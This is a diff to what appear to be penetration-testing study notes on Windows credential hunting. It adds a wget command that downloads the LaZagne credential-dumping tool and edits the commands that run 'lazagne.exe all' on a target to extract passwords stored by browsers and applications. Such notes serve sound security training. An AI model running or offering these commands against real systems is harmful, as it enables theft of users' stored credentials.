@@ -695,10 +695,16 @@ By default, it will search various OS settings and the file system for files & a
 
 Take advantage of third-party tools like Lazagne to quickly discover credentials that web browsers or other installed applications may insecurely store.
 It would be beneficial to keep a standalone copy of Lazagne on our attack host so we can quickly transfer it over to the target. Lazagne.exe will do just fine for us in this scenario.
-
+### Install lazagne
+```
+wget https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe
+```
 ### Running Lazagne All
 ```
-start lazagne.exe all
+lazagne.exe all
+```
+```
+C:\Users\example\Desktop\lazagne.exe all
 ```
 -vv to study what it is doing in the background.
 ### Using findstr
